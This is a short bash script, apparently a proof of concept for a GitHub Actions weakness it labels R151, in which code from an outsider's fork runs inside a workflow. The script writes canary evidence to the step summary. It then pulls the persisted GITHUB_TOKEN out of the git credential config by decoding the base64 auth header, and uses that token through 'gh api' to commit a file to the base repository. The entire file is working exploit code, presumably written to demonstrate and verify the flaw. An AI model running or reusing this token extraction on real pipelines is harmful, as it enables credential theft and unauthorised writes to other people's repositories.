#!/usr/bin/env bash
set -euo pipefail

canary_hash=$(printf '%s' "$R151_CANARY" | sha256sum | cut -d' ' -f1)
evidence=$(cat <<EOF
R151_FORK_CODE_EXECUTED=1
R151_CANARY_SHA256=$canary_hash
R151_SOURCE_REPOSITORY=$GITHUB_REPOSITORY
R151_TRIGGER_ACTOR=$GITHUB_ACTOR
EOF
)
printf '%s\n' "$evidence"
{
  printf '%s\n' "$evidence"
} >> "$GITHUB_STEP_SUMMARY"

credential_config=$(git config --local --get-regexp '^includeIf\.gitdir:.*\.path$' | awk 'NR == 1 {print $2}')
auth_header=$(git config --file "$credential_config" --get 'http.https://github.com/.extraheader')
encoded=${auth_header#AUTHORIZATION: basic }
token_pair=$(printf '%s' "$encoded" | base64 -d)
r151_token=${token_pair#x-access-token:}
r151_content=$(printf 'GH-R151 durable write from outsider fork %s\n' "$GITHUB_SHA" | base64 -w0)
r151_write_commit=$(GH_TOKEN="$r151_token" gh api \
  --method PUT \
  "repos/$GITHUB_REPOSITORY/contents/r151-token-write.txt" \
  -f message='GH-R151 outsider fork token write' \
  -f content="$r151_content" \
  --jq '.commit.sha')
printf 'R151_DURABLE_BASE_WRITE=contents/r151-token-write.txt\n'
printf 'R151_WRITE_COMMIT=%s\n' "$r151_write_commit"
